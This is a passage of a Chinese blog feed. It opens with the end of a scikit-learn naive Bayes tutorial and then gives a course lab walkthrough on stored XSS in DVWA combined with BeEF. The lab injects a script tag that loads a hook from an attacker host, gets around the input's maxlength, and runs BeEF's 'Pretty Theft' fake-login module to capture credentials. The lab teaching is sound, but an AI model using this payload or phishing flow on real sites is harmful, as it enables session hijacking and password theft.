class="line">[3]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 0.5s]</span><br></pre></td></tr></table></figure></p><p><strong><em>Tips</em></strong>: 多项式模型在训练一个数据集结束后可以继续训练其他数据集而无需将两个数据集放在一起进行训练。在sklearn中，MultinomialNB()类的partial_fit()方法可以进行这种训练。这种方式特别适合于训练集大到内存无法一次性放入的情况。</p><p>在第一次调用<code>partial_fit()</code>时需要给出所有的分类标号。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> MultinomialNB</span><br><span class="line">clf = MultinomialNB()</span><br><span class="line"><span class="hljs-comment">#在第一次调用时需要给出所有的分类标号</span></span><br><span class="line">clf.partial_fit(np.array([<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]).reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>), np.array([<span class="hljs-string">'aa'</span>]), [<span class="hljs-string">'aa'</span>,<span class="hljs-string">'bb'</span>])</span><br><span class="line">clf.partial_fit(np.array([<span class="hljs-number">6</span>,<span class="hljs-number">1</span>]).reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>), np.array([<span class="hljs-string">'bb'</span>]))</span><br><span class="line"></span><br><span class="line">print(clf.predict(np.array([<span class="hljs-number">9</span>,<span class="hljs-number">1</span>]).reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">'bb'</span>]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 0.5s]</span><br></pre></td></tr></table></figure></p><hr><h3 id="伯努利模型"><a href="#伯努利模型" class="headerlink" title="伯努利模型"></a>伯努利模型</h3><p>在伯努利模型中，对于一个样本来说，其特征用的是全局的特征。每个特征的取值是布尔型的，也就是true和false，或者1和0。在文本分类中，就是一个特征有没有在一个文档中出现。</p><p>如果特征值$x_{i}$为1，那么<br>$P(x_{i}|y_{k}) = P(x_{i}=1|y_{k})$<br>如果特征值$x_{i}$为0，那么<br>$P(x_{i}|y_{k}) = 1-P(x_{i}=1|y_{k})$</p><p>这意味着，“没有某个特征”也是一个特征。</p><h4 id="sklearn实例：-2"><a href="#sklearn实例：-2" class="headerlink" title="sklearn实例："></a>sklearn实例：</h4><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> BernoulliNB</span><br><span class="line">X = np.random.randint(<span class="hljs-number">2</span>, size=(<span class="hljs-number">6</span>, <span class="hljs-number">100</span>))</span><br><span class="line">Y = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])</span><br><span class="line">clf = BernoulliNB()</span><br><span class="line">clf.fit(X, Y)</span><br><span class="line">print(clf.predict(X[<span class="hljs-number">2</span>].reshape(<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[3]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 1.0s]</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;高斯、多项式、伯努利&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS结合Beef的社会工程学窃取密码实验</title>
    <link href="https://fansblog.club/2019/09/18/hacker-4/"/>
    <id>https://fansblog.club/2019/09/18/hacker-4/</id>
    <published>2019-09-18T07:07:20.000Z</published>
    <updated>2019-11-15T08:16:59.208Z</updated>
    
    <content type="html"><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p><p>不说废话了，直接切入正题……</p><p>本次实验共用到老师给的kali和被攻击的win7系统。</p><h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p><p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p><p>你会看到弹出一个终端如下：</p><p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p><p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p><p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p><p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p><p>我们输入用户名密码之后会显示如下页面：</p><p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p><p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p><h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p><p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p><p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p><p>之后点击启动，如下所示：</p><p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p><p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p><p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p><p>如图所示，我的win7的ip地址为192.168.73.129</p><h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p><p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p><p>用户名为admin，密码为password。登陆之后显示如下：</p><p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p><p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p><p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p><p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p><p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p><p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p><p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p><p>按下F12，查看源码。</p><p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p><p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p><p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p><p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p><p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p><p>改完之后可以关掉这个框框了。</p><p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p><p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p><p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p><p>是不是像下面这样显示呢？</p><p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p><p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p><p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p><p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p><p>让我们点击它，出现下面这个页面：</p><p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p><p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p><p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p><p>现在我们可以点击右下角的Execute了。</p><p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p><p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p><p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p><p>回到beef页面，你会在数据库中看到如下信息：</p><p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p><p>到这里这个实验就结束了！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;软件综合训练-终结篇&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件综合训练课程" scheme="https://fansblog.club/categories/%E8%BD%AF%E4%BB%B6%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83%E8%AF%BE%E7%A8%8B/"/>
    
    
  </entry>
  
</feed>
